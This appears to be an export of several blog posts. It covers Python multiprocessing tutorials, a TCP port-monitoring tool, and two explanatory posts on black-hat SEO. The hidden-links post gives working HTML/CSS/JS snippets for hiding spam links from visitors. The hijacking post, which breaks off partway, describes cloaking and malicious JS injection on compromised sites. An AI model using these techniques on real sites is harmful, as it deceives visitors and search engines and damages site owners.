<p>执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）</p>
<p>注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。</p>
<h5 id="同步进程池（阻塞）"><a href="#同步进程池（阻塞）" class="headerlink" title="同步进程池（阻塞）"></a>同步进程池（阻塞）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):</div><div class="line">       <span class="built_in">print</span> p</div><div class="line">       time.sleep(3)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	pool = Pool(processes=10)</div><div class="line">	<span class="keyword">for</span> i  <span class="keyword">in</span> xrange(500):</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	实际测试发现，for循环内部执行步骤：</div><div class="line">	（1）遍历500个可迭代对象，往进程池放一个子进程</div><div class="line">	（2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）</div><div class="line">	for循环执行完毕，再执行print函数。</div><div class="line">	'<span class="string">''</span></div><div class="line">	    pool.apply(<span class="built_in">test</span>, args=(i,))   <span class="comment">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.</span></div><div class="line"></div><div class="line">	<span class="built_in">print</span> “<span class="built_in">test</span>”</div><div class="line">	pool.close()</div><div class="line">	pool.join()</div></pre></td></tr></table></figure>
<p>说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程…..等500个子进程都执行完了，再执行print “test”。（从结果来看，并没有多进程并发）</p>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Multiprocessing </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing.Process]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing-Process/</url>
      <content type="html"><![CDATA[<p>　　利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池<a href="http://thief.one/2016/11/24/Multiprocessing-Pool">Pool</a>类。</p>
<h4 id="Process介绍"><a href="#Process介绍" class="headerlink" title="Process介绍"></a>Process介绍</h4><h5 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h5><ul>
<li>Process([group [, target [, name [, args [, kwargs]]]]])</li>
<li>group: 线程组，目前还没有实现，库引用中提示必须是None；</li>
<li>target: 要执行的方法；</li>
<li>name: 进程名；</li>
<li>args/kwargs: 要传入方法的参数。</li>
</ul>
<h5 id="实例方法："><a href="#实例方法：" class="headerlink" title="实例方法："></a>实例方法：</h5><ul>
<li>is_alive()：返回进程是否在运行。</li>
<li>join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。</li>
<li>start()：进程准备就绪，等待CPU调度。</li>
<li>run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。</li>
<li>terminate()：不管任务是否完成，立即停止工作进程。</li>
</ul>
<h5 id="属性："><a href="#属性：" class="headerlink" title="属性："></a>属性：</h5><ul>
<li>authkey</li>
<li>daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。</li>
<li>exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。</li>
<li>name：进程名字。</li>
<li>pid：进程号。</li>
</ul>
<h4 id="创建多进程的两种方法"><a href="#创建多进程的两种方法" class="headerlink" title="创建多进程的两种方法"></a>创建多进程的两种方法</h4><p>Process类中，可以使用两种方法创建子进程。</p>
<h5 id="使用Process创建子进程"><a href="#使用Process创建子进程" class="headerlink" title="使用Process创建子进程"></a>使用Process创建子进程</h5><p>说明：用法与Threading相似</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process  <span class="comment">#导入Process模块 </span></div><div class="line">import os  </div><div class="line"></div><div class="line">def <span class="built_in">test</span>(name):</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	函数输出当前进程ID，以及其父进程ID。</div><div class="line">	此代码应在Linux下运行，因为windows下os模块不支持getppid()</div><div class="line">	'<span class="string">''</span></div><div class="line">    <span class="built_in">print</span> <span class="string">"Process ID： %s"</span> % (os.getpid())  </div><div class="line">    <span class="built_in">print</span> <span class="string">"Parent Process ID： %s"</span> % (os.getppid())  </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	windows下，创建进程的代码一下要放在main函数里面</div><div class="line">	'<span class="string">''</span> </div><div class="line">    proc = Process(target=<span class="built_in">test</span>, args=(<span class="string">'nmask'</span>,))  </div><div class="line">    proc.start()  </div><div class="line">    proc.join()</div></pre></td></tr></table></figure>
<h5 id="使用Process类继承创建子进程"><a href="#使用Process类继承创建子进程" class="headerlink" title="使用Process类继承创建子进程"></a>使用Process类继承创建子进程</h5><p>说明：通过继承Process类，修改run函数代码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process</div><div class="line">import time</div><div class="line"></div><div class="line">class MyProcess(Process):</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">继承Process类，类似threading.Thread</div><div class="line">'<span class="string">''</span></div><div class="line">    def __init__(self, arg):</div><div class="line">        super(MyProcess, self).__init__()</div><div class="line">        <span class="comment">#multiprocessing.Process.__init__(self)</span></div><div class="line">        self.arg = arg</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    重构run函数</div><div class="line">    '<span class="string">''</span></div><div class="line">        <span class="built_in">print</span> <span class="string">'nMask'</span>, self.arg</div><div class="line">        time.sleep(1)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">        p = MyProcess(i)</div><div class="line">        p.start()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">    	p.join()</div></pre></td></tr></table></figure>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Multiprocessing </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python Multiprocessing]]></title>
      <url>http://thief.one/2016/11/23/Python-multiprocessing/</url>
      <content type="html"><![CDATA[<p>　　multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。</p>
<h4 id="（一）Multiprocessing介绍"><a href="#（一）Multiprocessing介绍" class="headerlink" title="（一）Multiprocessing介绍"></a>（一）Multiprocessing介绍</h4><h5 id="为什么要使用python多进程？"><a href="#为什么要使用python多进程？" class="headerlink" title="为什么要使用python多进程？"></a>为什么要使用python多进程？</h5><p>　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。<br>　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。<br>　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。</p>
<h5 id="multiprocessing常用组件及功能"><a href="#multiprocessing常用组件及功能" class="headerlink" title="multiprocessing常用组件及功能"></a>multiprocessing常用组件及功能</h5><p>创建管理进程模块：</p>
<ul>
<li><a href="http://thief.one/2016/11/24/Multiprocessing-Process">Process</a>（用于创建进程模块）</li>
<li><a href="http://thief.one/2016/11/24/Multiprocessing-Pool">Pool</a>（用于创建管理进程池）</li>
<li>Queue（用于进程通信，资源共享）</li>
<li>Value，Array（用于进程通信，资源共享）</li>
<li>Pipe（用于管道通信）</li>
<li>Manager（用于资源共享）</li>
</ul>
<p>同步子进程模块：</p>
<ul>
<li>Condition</li>
<li>Event</li>
<li>Lock</li>
<li>RLock</li>
<li>Semaphore</li>
</ul>
<h4 id="（二）Multiprocessing进程管理模块"><a href="#（二）Multiprocessing进程管理模块" class="headerlink" title="（二）Multiprocessing进程管理模块"></a>（二）Multiprocessing进程管理模块</h4><p>说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。</p>
<h5 id="Process模块"><a href="#Process模块" class="headerlink" title="Process模块"></a>Process模块</h5><p>Process模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。<br>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing-Process">Process模块介绍</a></p>
<h5 id="Pool模块"><a href="#Pool模块" class="headerlink" title="Pool模块"></a>Pool模块</h5><p>Pool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。<br>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing-Pool">Pool模块介绍</a></p>
<h5 id="Queue模块"><a href="#Queue模块" class="headerlink" title="Queue模块"></a>Queue模块</h5><p>Queue模块用来控制进程安全，与线程中的Queue用法一样。</p>
<h5 id="Pipe模块"><a href="#Pipe模块" class="headerlink" title="Pipe模块"></a>Pipe模块</h5><p>Pipe模块用来管道操作。</p>
<h5 id="Manager模块"><a href="#Manager模块" class="headerlink" title="Manager模块"></a>Manager模块</h5><p>Manager模块常与Pool模块一起使用，作用是共享资源。</p>
<h4 id="（三）Multiprocessing同步进程模块"><a href="#（三）Multiprocessing同步进程模块" class="headerlink" title="（三）Multiprocessing同步进程模块"></a>（三）Multiprocessing同步进程模块</h4><h5 id="Lock模块"><a href="#Lock模块" class="headerlink" title="Lock模块"></a>Lock模块</h5><p>作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。</p>
<p>具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。</p>
<p>代码实现：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process, Lock  </div><div class="line"></div><div class="line">def l(lock, num):  </div><div class="line">    lock.acquire()  </div><div class="line">    <span class="built_in">print</span> <span class="string">"Hello Num: %s"</span> % (num)  </div><div class="line">    lock.release()  </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </div><div class="line">    lock = Lock()  <span class="comment">#这个一定要定义为全局</span></div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(20):  </div><div class="line">        Process(target=l, args=(lock, num)).start()  <span class="comment">#这个类似多线程中的threading，但是进程太多了，控制不了。</span></div></pre></td></tr></table></figure></p>
<h5 id="Semaphore模块"><a href="#Semaphore模块" class="headerlink" title="Semaphore模块"></a>Semaphore模块</h5><p>作用：用来控制对共享资源的访问数量，例如池的最大连接数。</p>
<h5 id="Event模块"><a href="#Event模块" class="headerlink" title="Event模块"></a>Event模块</h5><p>作用：用来实现进程间同步通信。</p>
<h4 id="（四）Multiprocessing-dummy多线程"><a href="#（四）Multiprocessing-dummy多线程" class="headerlink" title="（四）Multiprocessing.dummy多线程"></a>（四）Multiprocessing.dummy多线程</h4><p>Multiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。</p>
<h4 id="（五）使用Multiprocessing疑问"><a href="#（五）使用Multiprocessing疑问" class="headerlink" title="（五）使用Multiprocessing疑问"></a>（五）使用Multiprocessing疑问</h4><ul>
<li><em>启动多进程的代码一定要放在 </em>if <strong>name</strong>==”<strong>main</strong>“:<em> 后面吗？</em></li>
</ul>
<p>　　解答：windows系统下，想要启动一个子进程，必须加上<em>if <strong>name</strong>==”<strong>main</strong>“:</em>，linux则不需要。</p>
<ul>
<li><em>父进程中的全局变量能被子进程共享吗？</em></li>
</ul>
<p>　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。</p>
<ul>
<li><em>子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?</em></li>
</ul>
<p>　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。<br>　　那么问题就又变成了父进程什么时候该结束所有进程？<br>　　其中一个思路是<em>获取每个子进程的返回值</em>，一旦有返回True（结束的标记），则立马结束所有进程；<br>　　另外一种思路是<em>使用共享资源</em>，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）</p>
<ul>
<li><em>子进程中还能再创建子进程吗？</em></li>
</ul>
<p>解答：可以，子进程可以再创建进程，线程中也可以创建进程。</p>
<h4 id="（六）多进程资源共享问题"><a href="#（六）多进程资源共享问题" class="headerlink" title="（六）多进程资源共享问题"></a>（六）多进程资源共享问题</h4><p>多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。</p>
<p>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing共享资源">多进程资源共享问题</a></p>
<h4 id="（七）获取子进程返回值问题"><a href="#（七）获取子进程返回值问题" class="headerlink" title="（七）获取子进程返回值问题"></a>（七）获取子进程返回值问题</h4><p>多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。</p>
<p>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing子进程返回值">获取子进程返回值问题</a></p>
<hr>

<p>参考网络文章：</p>
<p><a href="http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html" target="_blank" rel="external">http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html</a><br><a href="http://www.cnblogs.com/kaituorensheng/p/4465768.html" target="_blank" rel="external">http://www.cnblogs.com/kaituorensheng/p/4465768.html</a><br>……<br>太多了，列举不完，排名不分先后。</p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Multiprocessing </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TcpScanner端口存活探测]]></title>
      <url>http://thief.one/2016/10/14/TcpScanner%E7%AB%AF%E5%8F%A3%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B/</url>
      <content type="html"><![CDATA[<p>　　TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。</p>
<h3 id="TcpScanner介绍"><a href="#TcpScanner介绍" class="headerlink" title="TcpScanner介绍"></a>TcpScanner介绍</h3><p>在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。<br>先来一张截图：<br><img src="/upload_image/20161014/jietu.png" alt=""><br>背景金刚狼！</p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul>
<li>检测服务器端口存活性</li>
<li>支持nslookup</li>
<li>邮件告警（1.3版本中已加入）</li>
</ul>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>图形化界面，管理方便使用简单</li>
<li>支持批量服务器端口检测</li>
<li>自定义扫描间隔，自定义结果筛选条件</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>目前只支持tcp扫描</li>
<li>没有优化，可能存在一些bug</li>
</ul>
<h3 id="TcpScanner用法"><a href="#TcpScanner用法" class="headerlink" title="TcpScanner用法"></a>TcpScanner用法</h3><h4 id="（1）填写excel"><a href="#（1）填写excel" class="headerlink" title="（1）填写excel"></a>（1）填写excel</h4><p>先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。<br><img src="/upload_image/20161014/excel.png" alt=""><br>严格按照模板填写，否则可能会使结果不准确，<em>NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。</em></p>
<h4 id="（2）加载excel"><a href="#（2）加载excel" class="headerlink" title="（2）加载excel"></a>（2）加载excel</h4><p>运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。</p>
<h4 id="（3）检测excel"><a href="#（3）检测excel" class="headerlink" title="（3）检测excel"></a>（3）检测excel</h4><p>点击检测，程序将对excel填写内容进行检测，如无问题则显示<em>导入excel成功</em>，如有问题则检查excel填写是否有误。</p>
<h4 id="（4）选择参数"><a href="#（4）选择参数" class="headerlink" title="（4）选择参数"></a>（4）选择参数</h4><p>选择运行间隔、中断筛选参数。<br>注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。</p>
<h4 id="（5）开始运行"><a href="#（5）开始运行" class="headerlink" title="（5）开始运行"></a>（5）开始运行</h4><p>　　点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。</p>
<p>　　此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。</p>
<p>注：<em>在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。</em></p>
<h3 id="TcpScanner下载"><a href="#TcpScanner下载" class="headerlink" title="TcpScanner下载"></a>TcpScanner下载</h3><p>（GITHUB源代码下载）：<a href="https://github.com/tengzhangchao/TcpScanner" target="_blank" rel="external">TcPScannerV1.2</a><br>（百度网盘下载）：<a href="http://pan.baidu.com/s/1hsjYQlI" target="_blank" rel="external">TcPScannerV1.2</a><br>（如果需要1.3版本，可以在博客下方留言）</p>
<p>结语：<em>工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！</em></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 扫描器 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之暗链]]></title>
      <url>http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/</url>
      <content type="html"><![CDATA[<p>　　暗链也称为<em>黑链</em>，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。</p>
<p>　　挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。</p>
<h3 id="利用CSS实现挂暗链"><a href="#利用CSS实现挂暗链" class="headerlink" title="利用CSS实现挂暗链"></a>利用CSS实现挂暗链</h3><h4 id="display属性"><a href="#display属性" class="headerlink" title="display属性"></a>display属性</h4><p>将display属性设置为none，则页面上不显示此内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"display:none;"</span>&gt;</div><div class="line">&lt;a href=http://thief.one/ &gt;暗链&lt;/a&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<p>分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。</p>
<h4 id="color-font-size-line-height属性"><a href="#color-font-size-line-height属性" class="headerlink" title="color/font-size/line-height属性"></a>color/font-size/line-height属性</h4><p>将color颜色设置与页面背景色一样，大小设置为小于或等于1。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=http://thief.one style=<span class="string">"color:#FFFFFF;font-size:1px;line-height:1px ;"</span>&gt;暗链&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>分析：最初级的隐蔽链接，易被搜索引擎察觉。</p>
<h4 id="position属性"><a href="#position属性" class="headerlink" title="position属性"></a>position属性</h4><p>将position位置属性设置成负数，使内容位于页面可见范围以外。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"position: absolute; top: -999px;left: -999px;"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"position:absolute;left:expression_r(1-900);top:expression_r(3-999);"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。</p>
<h4 id="marquee属性"><a href="#marquee属性" class="headerlink" title="marquee属性"></a>marquee属性</h4><p>设置marquee滚动标签属性，使之快速闪现。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;marquee height=1 width=5 scrollamount=3000 scrolldelay=20000&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/marquee&gt;</div></pre></td></tr></table></figure></p>
<p>分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。</p>
<h3 id="利用JS实现挂暗链"><a href="#利用JS实现挂暗链" class="headerlink" title="利用JS实现挂暗链"></a>利用JS实现挂暗链</h3><p>利用js向页面中写入css代码，设置属性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">document.write(<span class="string">"&lt;div style='display:none;'&gt;"</span>);</div><div class="line">&lt;/script&gt;&lt;div&gt;</div><div class="line"></div><div class="line">&lt;a href=http://thief.one&gt;暗链&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;script language=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">document.write(<span class="string">"&lt;/div&gt;"</span>);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。</p>
<h3 id="利用DIV-JS实现挂暗链"><a href="#利用DIV-JS实现挂暗链" class="headerlink" title="利用DIV+JS实现挂暗链"></a>利用DIV+JS实现挂暗链</h3><p>利用div与js功能，修改属性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;div id=<span class="string">"anlian"</span>&gt;&lt;a href=<span class="string">"http://thief.one"</span>&gt;暗链&lt;/a&gt;&lt;/div&gt;</div><div class="line">&lt;script language=javascript&gt;</div><div class="line">document.getElementById(<span class="string">"anlian"</span>).style.display=<span class="string">"none"</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。</p>
<h3 id="挂暗链高级姿势"><a href="#挂暗链高级姿势" class="headerlink" title="挂暗链高级姿势"></a>挂暗链高级姿势</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;div class=<span class="string">"father"</span> style=<span class="string">"position:relative"</span>&gt;</div><div class="line">　　&lt;div class=<span class="string">"topLever"</span> style=<span class="string">"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee"</span>&gt;遮挡层：可以放图片或者Flash&lt;/div&gt;</div><div class="line">　　&lt;div class=<span class="string">"hideDontent"</span>&gt;隐蔽层：可以放暗链链接&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。</p>
<p>结语：<em>暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！</em></p>
]]></content>
      
        <categories>
            
            <category> 黑产研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 黑帽SEO </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之网页劫持]]></title>
      <url>http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/</url>
      <content type="html"><![CDATA[<p>　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。</p>
<h3 id="服务端劫持"><a href="#服务端劫持" class="headerlink" title="服务端劫持"></a>服务端劫持</h3><p>服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。</p>
<h4 id="asp-aspx-php劫持"><a href="#asp-aspx-php劫持" class="headerlink" title="asp/aspx/php劫持"></a>asp/aspx/php劫持</h4><p>　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。</p>
<h3 id="客户端劫持"><a href="#客户端劫持" class="headerlink" title="客户端劫持"></a>客户端劫持</h3><p>客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。</p>
<h4 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h4><p>js劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。<br>js植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。</p>
